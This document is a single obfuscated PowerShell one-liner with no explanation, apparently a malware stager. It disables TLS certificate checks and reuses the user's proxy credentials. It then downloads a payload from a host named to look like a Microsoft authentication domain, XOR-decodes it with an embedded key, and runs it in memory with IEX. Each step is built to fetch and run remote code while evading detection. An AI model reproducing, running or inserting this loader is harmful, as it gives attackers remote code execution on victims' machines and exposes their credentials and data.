
[SYSTEm.Net.ServicePOintMaNAGer]::ExPeCt100COntInue = 0;$wc=NEW-ObJEct SySTEm.Net.WeBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEadERS.ADd('User-Agent',$u);$wc.ProxY = [SysTEm.NET.WeBREQuEST]::DEFAUlTWeBProxy;$wc.ProXY.CreDenTIalS = [SYsTEm.NEt.CReDENtiALCache]::DefAUlTNETWorkCredEntIalS;$K='563b21c9be06f2141e162c1c0cc5e7d1';$I=0;[chAr[]]$B=([cHar[]]($wc.DoWnloaDStRiNg("https://msauth.net/index.asp")))|%{$_-bXOR$k[$i++%$K.LEnGTH]};IEX ($B-jOIN'')

